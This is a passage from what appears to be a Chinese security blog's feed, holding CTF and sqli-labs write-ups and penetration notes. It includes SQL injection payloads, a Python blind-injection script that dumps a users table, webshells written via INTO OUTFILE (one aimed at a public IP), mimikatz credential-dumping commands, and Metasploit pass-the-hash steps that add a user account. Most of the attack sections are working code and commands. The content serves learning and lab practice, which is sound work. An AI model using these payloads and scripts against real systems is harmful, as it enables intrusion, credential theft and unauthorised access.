%</th><th></th></tr></thead><tbody><tr><td>1</td><td>D</td><td>3950</td><td>12.9381</td></tr><tr><td>2</td><td>C</td><td>1900</td><td>6.2234</td></tr><tr><td>3</td><td>T</td><td>1850</td><td>6.0596</td></tr><tr><td>4</td><td>F</td><td>1800</td><td>5.8958</td></tr><tr><td>5</td><td>{</td><td>1750</td><td>5.7321</td></tr><tr><td>6</td><td>t</td><td>1700</td><td>5.5683</td></tr><tr><td>7</td><td>u</td><td>1650</td><td>5.4045</td></tr><tr><td>8</td><td>0</td><td>1600</td><td>5.2407</td></tr><tr><td>9</td><td>k</td><td>1550</td><td>5.077</td></tr><tr><td>10</td><td>U</td><td>1500</td><td>4.9132</td></tr><tr><td>11</td><td>a</td><td>1450</td><td>4.7494</td></tr><tr><td>12</td><td>n</td><td>1400</td><td>4.5857</td></tr><tr><td>13</td><td>s</td><td>1350</td><td>4.4219</td></tr><tr><td>14</td><td>h</td><td>1300</td><td>4.2581</td></tr><tr><td>15</td><td>i</td><td>1250</td><td>4.0943</td></tr><tr><td>16</td><td>y</td><td>1200</td><td>3.9306</td></tr><tr><td>17</td><td>e</td><td>1150</td><td>3.7668</td></tr><tr><td>18</td><td>!</td><td>1100</td><td>3.603</td></tr><tr><td>19</td><td>}</td><td></td></tr></tbody></table><p>DDCTF{tu0kUanshiye!}</p><h2 id="Web-1-数据库的秘密"><a href="#Web-1-数据库的秘密" class="headerlink" title="Web 1 数据库的秘密"></a>Web 1 数据库的秘密</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212006_929.png" alt=""></p><p>使用插件modify headers加一个x-forward-for: 123.232.23.245</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804212005_33.png" alt=""></p><p>打开题目是三个搜索框和一个数据表格，分析form表单发现隐藏一处所以更改本地复现进行注入</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220047_85.png" alt=""></p><p>发现是bool盲注，并用burp fuzz一下</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804220050_110.png" alt=""></p><p>发现union，database（）都被过滤</p><p>准语句：0’&amp;&amp;if(ascii(substr((select version()),1,1))&gt;0,1,0)#</p><p>得到库名：0’ &amp;&amp; if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;0,1,0)#：DDCTF</p><p>得到表名0’&amp;&amp;if(ascii(substr((select table_name from information_schema.tables where table_schema=’ddctf’))&gt;0,1,0)#：ctf_key1</p><p>得到字段名 0’&amp;&amp;if(ascii(substr((select column_name from information_schema.columns where table_name=’ctf_key1’ limit 0,1),9,1))&gt;0,1,0)#：secvalue</p><p>得到flag  0’&amp;&amp;if(ascii(substr((select secvalue from ctf_key1 limit 0,1),1,1))&gt;0,1,0)#   ====0’ &amp;&amp; substr((select secvalue from ddctf.ctf_key1 limit 0,1),1,1)=’d’#</p><p>DDCTF{IKIDLHNZMKFUDEQE}</p><blockquote><p><strong>substr()函数</strong></p><p>​    Substr()和substring()函数实现的功能是一样的，均为截取字符串。</p><p>​    string substring(string, start, length)</p><p>​    string substr(string, start, length)</p><p>​    参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。</p></blockquote><p>另附大佬一的奇特方法直接显注：</p><p>此waf为假waf 使用超过100个参数可以绕过</p><p><a href="http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/" target="_blank" rel="external">http://www.hayasec.me/2018/04/20/ddctf-web1-writeup/</a></p><p>大佬二sqlmap一把梭：</p><p>对于此题，采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。<br><code>proxy.php</code> 代码如下：</p><pre><code>&lt;?php@$id = $_REQUEST[&#39;id&#39;];@$title = $_REQUEST[&#39;title&#39;];@$author = $_REQUEST[&#39;author&#39;];@$date = $_REQUEST[&#39;date&#39;];$time = time();$sig = sha1(&#39;id=&#39;.$id.&#39;title=&#39;.$title.&#39;author=&#39;.$author.&#39;date=&#39;.$date.&#39;time=&#39;.$time.&#39;adrefkfweodfsdpiru&#39;);$ch = curl_init();$post = [    &#39;id&#39; =&gt; $id,    &#39;title&#39; =&gt; $title,    &#39;author&#39; =&gt; $author,    &#39;date&#39; =&gt; $date,];curl_setopt($ch, CURLOPT_URL,&quot;http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time&quot;);curl_setopt($ch, CURLOPT_HTTPHEADER, array(    &#39;X-Forwarded-For: 123.232.23.245&#39;,    ));curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, $post);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_HEADER, true);$ch_out = curl_exec($ch);$ch_info = curl_getinfo($ch);$header = substr($ch_out, 0, $ch_info[&#39;header_size&#39;]);$body = substr($ch_out, $ch_info[&#39;header_size&#39;]);http_response_code($ch_info[&#39;http_code&#39;]);//header($header);//echo $header;echo $body;</code></pre><p>sqlmap 一把梭，对代理 PHP 页面进行注入，注入点果然位于 <code>author</code>，获得 flag。</p><blockquote><p><code>sqlmap.py -u &#39;http://127.0.0.1/proxy.php?author=admin&#39; --dump</code></p></blockquote><p><img src="https://clannad.me/image/web-1.png" alt="Web-1"></p><p><a href="https://clannad.me/ddctf.md.html" target="_blank" rel="external">https://clannad.me/ddctf.md.html</a></p><p><a href="http://sec2hack.com/ctf/ddctf-2018-web-writeup.html" target="_blank" rel="external">http://sec2hack.com/ctf/ddctf-2018-web-writeup.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF三道小结&quot;&gt;&lt;a href=&quot;#DDCTF三道小结&quot; class=&quot;headerlink&quot; title=&quot;DDCTF三道小结&quot;&gt;&lt;/a&gt;DDCTF三道小结&lt;/h1&gt;&lt;p&gt;太菜了 就只能做出三道题，继续加油，明年再战&lt;/p&gt;
&lt;h2 id=&quot;╯°□°）╯︵
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>高级入侵</title>
    <link href="http://0xmj.club/2018/04/23/%E9%AB%98%E7%BA%A7%E5%85%A5%E4%BE%B5/"/>
    <id>http://0xmj.club/2018/04/23/高级入侵/</id>
    <published>2018-04-23T13:33:14.000Z</published>
    <updated>2018-04-23T13:36:24.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高级入侵"><a href="#高级入侵" class="headerlink" title="高级入侵"></a>高级入侵</h1><h3 id="Windows权限分析与密码安全测试"><a href="#Windows权限分析与密码安全测试" class="headerlink" title="Windows权限分析与密码安全测试"></a>Windows权限分析与密码安全测试</h3><p>1.windows xp写入管理员权限<br>2.windows 2003默认权限<br>—–默认只安装静态HTTP服务器<br>—–增强的文件访问控制<br>—–父目录被禁用<br>—–坚持最小特权原则</p><p>注意给users组只有读取和运行权限</p><p>直接在系统上面运行上面与webshell下运行木马区别<br>在系统上运行木马是系统权限运行，在webshell下运行木马是以当前内置中间件权限运行</p><p>中间件权限<br>1.菜刀进入右键<br>执行<br>whomai<br>得知自身权限<br>2.cd c:\www\<br>3.dir</p><h3 id="本地管理员密码如何直接提取"><a href="#本地管理员密码如何直接提取" class="headerlink" title="本地管理员密码如何直接提取"></a>本地管理员密码如何直接提取</h3><p>1.直接通过mimikatz读取管理员密码（win7 winxp）<br>第一条 ：privilege::debug  //提升权限<br>第二条：sekurlsa::logonpa ssWords //抓取密码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091859_724.png" alt=""></p><p>2.webshell  </p><p>3.<a href="http://www.4hou.com/tools/7404.html" target="_blank" rel="external">Lazagne-master</a></p><p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="http://oy0tigw51.bkt.clouddn.com/201801091927_696.png" alt=""></p><p>use exploit/windows/smb/psexec<br>show option<br>set RHOST 192.168.1.109<br>set SMBUser administrator<br>set SMPass   (根目录下的pass.txt里的哈希值)<br>exploit<br>shell<br>net user<br>net user 123 123 / add</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091956_886.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801091957_230.png" alt=""></p><p>本地哈希破解<br>注意本地搜索sam 这个是目标机里的所有密码</p><p>5.通过LC5暴力破解hash密码<br>使用gmer直接提取sam和sysytem文件或用pwdump7提取HASH 最后使用LC5破解</p><p>6.使用Ophcrack（kali）破解系统hash密码</p><h3 id="获取Webshell方法总结"><a href="#获取Webshell方法总结" class="headerlink" title="获取Webshell方法总结"></a>获取Webshell方法总结</h3><h4 id="主要通过谷歌搜索cms漏洞"><a href="#主要通过谷歌搜索cms漏洞" class="headerlink" title="主要通过谷歌搜索cms漏洞"></a>主要通过谷歌搜索cms漏洞</h4><p>phpcms discuz phpwind</p><h4 id="非cms获取webshell方法"><a href="#非cms获取webshell方法" class="headerlink" title="非cms获取webshell方法"></a>非cms获取webshell方法</h4><p>1.数据库备份获取<br>2.抓包上传获取<br>3.sql命令获取<br>4.模板修改获取<br>5.插入一句话获取<br>6.修改上传类型获取</p><h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>PHPmyadmin获取</p><pre><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]);echo \&#39;&lt;pre&gt;\&#39;;?&gt;&#39; into outfile &#39;E:/xamp/www/xioam.php&#39;</code></pre><p>php爆路径方法收集<br><img src="http://oy0tigw51.bkt.clouddn.com/201801092306_259.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092322_426.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092325_134.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092326_398.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092327_366.png" alt=""></p><p>tomcat获取<br>weblogic获取<br>jboss获取</p><h3 id="内网远程连接"><a href="#内网远程连接" class="headerlink" title="内网远程连接"></a>内网远程连接</h3><p>webshell如何开启3389</p><p>服务器端口被修改如何查找</p><p>cmd<br>tasklist /svc 寻找TermService</p><p>netstat -ano<br>查看所有端口</p><p>服务器处于内网如何连接</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;高级入侵&quot;&gt;&lt;a href=&quot;#高级入侵&quot; class=&quot;headerlink&quot; title=&quot;高级入侵&quot;&gt;&lt;/a&gt;高级入侵&lt;/h1&gt;&lt;h3 id=&quot;Windows权限分析与密码安全测试&quot;&gt;&lt;a href=&quot;#Windows权限分析与密码安全测试&quot; class=&quot;
      
    
    </summary>
    
      <category term="渗透" scheme="http://0xmj.club/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="入侵" scheme="http://0xmj.club/tags/%E5%85%A5%E4%BE%B5/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://0xmj.club/2018/04/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://0xmj.club/2018/04/02/信息收集/</id>
    <published>2018-04-02T08:15:51.000Z</published>
    <updated>2018-04-02T08:19:00.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201803241742_133.png" alt=""></p><p>1、robots.txt<br>2、网站备份压缩文件<br>    可能为.rar、zip、.7z、.tar.gz、.bak、.txt、.swp等等，以及和网站信息有关的文件名www.rar、web、rar等等<br>3、Git导致文件泄露<br><img src="http://oy0tigw51.bkt.clouddn.com/201803241744_967.png" alt=""><br>4、DS_store导致文件泄露<br>5、SVN导致文件泄露<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p><pre><code>1) 漏洞利用工具： Seay SVN漏洞利用工具2) 添加网站url</code></pre><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br>6、WEB-INF/web.xml泄露<br>        6.1、环境搭建<br>        6.2、访问页面<br>        6.3、扫描<br>        6.4、验证结果<br>7、Zoomeye搜索引擎使用<br>        7.1、搜索规则<br>        7.2、搜索技巧<br>        7.3、实战搜索<br>8、bing搜索引擎使用<br>9、Fofa搜索<br>10、站长工具<br>        10.1、站长工具Whois<br>        10.2、seo综合查询<br>        10.3、站长工具tool</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51.bkt.clouddn.com/201803241742_133.pn
      
    
    </summary>
    
      <category term="渗透" scheme="http://0xmj.club/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="信息收集" scheme="http://0xmj.club/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs less11-15</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs-less11-15/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs-less11-15/</id>
    <published>2018-04-02T08:15:38.000Z</published>
    <updated>2018-04-23T13:25:38.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-less11-15"><a href="#sqli-labs-less11-15" class="headerlink" title="sqli-labs less11-15"></a>sqli-labs less11-15</h1><p>[TOC]</p><h3 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h3><p>uname=1’ or 1=1 # &amp;passwd=x</p><h3 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h3><p>uname=1”) or 1=1 # &amp;passwd=x</p><h3 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h3><p>username：1’<br>Password： （随便输）<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘12’) LIMIT 0,1’ at line 1<br>‘) 我们可以知道程序对 id 进行了 ‘) 的处理。</p><p>uname=1’) or 1=1 # &amp;passwd=x</p><h3 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h3><p>uname=admin”and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit</p><p>###less15POST型基于时间盲注<br>uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Subm<br>it</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>uname=”) or 1=1#&amp;passwd=x<br>或<br>uname=”) or if(length(database())=8,1,sleep(2))#&amp;passwd=x</p><h3 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h3><p>Username：admin<br>Password：1’ You have an error in your SQL syntax; check the manual that corresponds<br>to your MySQL server version for the right syntax to use near ‘admin’’<br>at line 1<br>可以看到 admin’’ 说明在对密码的处理过程中使用的是 ‘’ 。<br>接下来利用盲注进行注入。<br>这里首先演示一下报错类型的盲注。<br>uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>Less-18 Header Injection- Error Based- string<br>在header里的User-Agent后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-19 Header Injection- Referer- Error Based- string<br>在header里的Referer后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-20 Cookie Injection- Error Based- string<br>在header里的Cookie附上payload：<br>uname=admin’ order by 3#<br>uname=x’ union select 1,database(),3#<br>uname=x’ union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-21 Cookie Injection- Error Based- complex - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin’) order by 3#<br>uname=x’) union select 1,database(),3#<br>uname=x’) union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-22 Cookie Injection- Error Based- Double Quotes - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin” order by 3#<br>uname=x” union select 1,database(),3#<br>uname=x” union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs-less11-15&quot;&gt;&lt;a href=&quot;#sqli-labs-less11-15&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs less11-15&quot;&gt;&lt;/a&gt;sqli-labs less11-15&lt;/h1&gt;&lt;p&gt;[T
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs  less7-10</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs-less7-10/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs-less7-10/</id>
    <published>2018-04-02T08:15:23.000Z</published>
    <updated>2018-04-23T13:25:26.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-less7-10"><a href="#sqli-labs-less7-10" class="headerlink" title="sqli-labs  less7-10"></a>sqli-labs  less7-10</h1><p>[TOC]</p><h3 id="less-7：GET-基于错误-双引号-文件导出"><a href="#less-7：GET-基于错误-双引号-文件导出" class="headerlink" title="less-7：GET-基于错误-双引号-文件导出"></a>less-7：GET-基于错误-双引号-文件导出</h3><p>练习mysql的文件写入。我们的目的是将一句话木马写入到网站的Less-7目录下</p><p>先去用 ‘ “  之类的测试<br>发现，用 “ 返回页面无变化，用 ‘ 返回页面出错，说明这个结构肯定是带 ‘ 的。</p><p>‘ 的返回页面为：<br><img src="http://oy0tigw51.bkt.clouddn.com/201803172221_893.png" alt=""></p><p>但是绝对和单引号有关，所以试试 ‘)  ,  ‘))</p><p>‘) 也错了</p><p>‘)) 返回页面正常！！</p><p>说明sql语句应该是这样：</p><pre><code> select * from table where id = ((&#39;input&#39;));</code></pre><p><a href="http://43.247.91.228:84/Less-7/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-7/?id=1</a>‘)) union select 1,2,”&lt;?php @eval($_POST[‘cmd’]); ?&gt;” into outfile “/var/www/html/dd1.php”</p><h3 id="less-8：GET-基于布尔类型-盲注"><a href="#less-8：GET-基于布尔类型-盲注" class="headerlink" title="less-8：GET-基于布尔类型-盲注"></a>less-8：GET-基于布尔类型-盲注</h3><p>发现加个单引号跟没加显示不一样，加了单引号连you are in都不显示了，没有报错，所以只能用盲注判断了<br><a href="http://43.247.91.228:84/Less-8/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-8/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;64 %23  </p><p>放一个脚本：</p><pre><code># coding: utf-8import urllib2import urllibsuccess_str = &quot;You are in&quot;getTable = &quot;users&quot;index = &quot;0&quot;url = &quot;http://43.247.91.228:84/Less-8/?id=1&quot;database = &quot;database()&quot;selectDB = &quot;select database()&quot;selectTable = &quot;select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1&quot;asciiPayload = &quot;&#39; and ascii(substr((%s),%d,1))&gt;=%d #&quot;lengthPayload = &quot;&#39; and length(%s)&gt;=%d #&quot;selectTableCountPayload = &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d #&quot;selectTableNameLengthPayloadfront = &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;# 获取字符串的长度def getLengthOfString(payload, string):    # 猜长度    lengthLeft = 0    lengthRigth = 0    guess = 10    # 确定长度上限，每次增加5    while 1:        # 如果长度大于guess        if getLengthResult(payload, string, guess) == True:            # 猜测值增加5            guess = guess + 5        else:            lengthRigth = guess            break            # print &quot;lengthRigth: &quot; + str(lengthRigth)    # 二分法查长度    mid = (lengthLeft + lengthRigth) / 2    while lengthLeft &lt; lengthRigth - 1:        # 如果长度大于等于mid        if getLengthResult(payload, string, mid) == True:            # 更新长度的左边界为mid            lengthLeft = mid        else:            # 否则就是长度小于mid            # 更新长度的右边界为mid            lengthRigth = mid            # 更新中值        mid = (lengthLeft + lengthRigth) / 2        # print lengthLeft, lengthRigth    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth    # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8    return lengthLeft# 获取名称def getName(payload, string, lengthOfString):    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符    tmp = &#39;&#39;    for i in xrange(1, lengthOfString + 1):        left = 32        right = 127        mid = (left + right) / 2        while left &lt; right - 1:            # 如果该字符串的第i个字符的ascii码大于等于mid            if getResult(payload, string, i, mid) == True:                # 则更新左边界                left = mid                mid = (left + right) / 2            else:                # 否则该字符串的第i个字符的ascii码小于mid                # 则更新右边界                right = mid                # 更新中值            mid = (left + right) / 2        tmp += chr(left)    return tmp# 发送请求，根据页面的返回的判断长度的猜测结果# string:猜测的字符串 payload:使用的payload  length：猜测的长度def getLengthResult(payload, string, length):    finalUrl = url + urllib.quote(payload % (string, length))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False # 发送请求，根据页面的返回的判断猜测的字符是否正确# payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的asciidef getResult(payload, string, pos, ascii):    finalUrl = url + urllib.quote(payload % (string, pos, ascii))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False# 注入def inject():    # 猜数据库长度    lengthOfDBName = getLengthOfString(lengthPayload, database)    print &quot;length of DBname: &quot; + str(lengthOfDBName)    # 获取数据库名称    DBname = getName(asciiPayload, selectDB, lengthOfDBName)    print &quot;current database:&quot; + DBname    # 获取数据库中的表的个数    # print selectTableCountPayload    tableCount = getLengthOfString(selectTableCountPayload, DBname)    print &quot;count of talbe:&quot; + str(tableCount)    # 获取数据库中的表    for i in xrange(0, tableCount):        # 第几个表        num = str(i)        # 获取当前这个表的长度        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)        print &quot;current table length:&quot; + str(tableNameLength)        # 获取当前这个表的名字        selectTableName = selectTable % (DBname, i)        tableName = getName(asciiPayload, selectTableName, tableNameLength)        print tableName    selectColumnCountPayload = &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d #&quot;    # print selectColumnCountPayload    # 获取指定表的列的数量    columnCount = getLengthOfString(selectColumnCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)    # 获取该表有多少行数据    dataCountPayload = &quot;&#39;and (select count(*) from %s)&gt;=%d #&quot;    dataCount = getLengthOfString(dataCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)    data = []    # 获取指定表中的列    for i in xrange(0, columnCount):        # 获取该列名字长度        selectColumnNameLengthPayload = &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(            i) + &quot;,1)&gt;=%d #&quot;        # print selectColumnNameLengthPayload        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)        print &quot;current column length:&quot; + str(columnNameLength)        # 获取该列的名字        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1&quot;        selectColumnName = selectColumn % (getTable, i)        # print selectColumnName        columnName = getName(asciiPayload, selectColumnName, columnNameLength)        print columnName        tmpData = []        tmpData.append(columnName)        # 获取该表的数据        for j in xrange(0, dataCount):            columnDataLengthPayload = &quot;&#39;and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;            # print columnDataLengthPayload            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)            # print columnDataLength            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;            columnData = getName(asciiPayload, selectData, columnDataLength)            # print columnData            tmpData.append(columnData)        data.append(tmpData)        # print data    # 格式化输出数据    # 输出列名    tmp = &quot;&quot;    for i in xrange(0, len(data)):        tmp += data[i][0] + &quot;   &quot;    print tmp    # 输出具体数据    for j in xrange(1, dataCount + 1):        tmp = &quot;&quot;        for i in xrange(0, len(data)):            tmp += data[i][j] + &quot;   &quot;        print tmpif __name__ == &quot;__main__&quot;:    print &quot;-----------inject starting----------&quot;    inject()</code></pre><p>与less5相似</p><h3 id="less-9：GET-基于时间类型-盲注"><a href="#less-9：GET-基于时间类型-盲注" class="headerlink" title="less-9：GET-基于时间类型-盲注"></a>less-9：GET-基于时间类型-盲注</h3><p>基于时间的盲注，只用修改一下上面的python脚本即可实现，加个时间判断，payload：<br><a href="http://127.0.0.1/sql/Less-9/?id=1" target="_blank" rel="external">http://127.0.0.1/sql/Less-9/?id=1</a>‘ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(2)) %23<br>这里if判断为真，所以会执行sleep(2)，查询操作会有明显的延迟。如果为假，即不正确，那么就不会执行sleep(2)，页面回显会明显的很快。<br>在了解了这些基本知识之后，我们使用一下payload来sql注入<br><a href="http://192.168.1.158/sqli-labs/Less-8/?id=1‘" target="_blank" rel="external">http://192.168.1.158/sqli-labs/Less-8/?id=1‘</a> and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第10关只要把前面两关payload部分的单引号改成双引号即可。<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="external">http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs-less7-10&quot;&gt;&lt;a href=&quot;#sqli-labs-less7-10&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs  less7-10&quot;&gt;&lt;/a&gt;sqli-labs  less7-10&lt;/h1&gt;&lt;p&gt;[TOC
      
    
    </summary>
    
      <category term="SQL" scheme="http://0xmj.club/categories/SQL/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs5-6(盲注)</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs5-6-%E7%9B%B2%E6%B3%A8/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs5-6-盲注/</id>
    <published>2018-04-02T08:14:58.000Z</published>
    <updated>2018-04-23T13:25:31.960Z</updated>
    
